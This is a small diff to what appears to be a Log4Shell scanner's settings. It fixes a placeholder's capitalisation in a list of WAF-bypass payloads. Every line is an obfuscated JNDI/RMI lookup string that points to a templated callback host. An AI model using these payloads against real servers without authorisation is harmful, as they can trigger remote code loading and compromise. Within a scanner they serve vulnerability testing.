@@ -52,7 +52,7 @@ timeout = 4
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                        "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
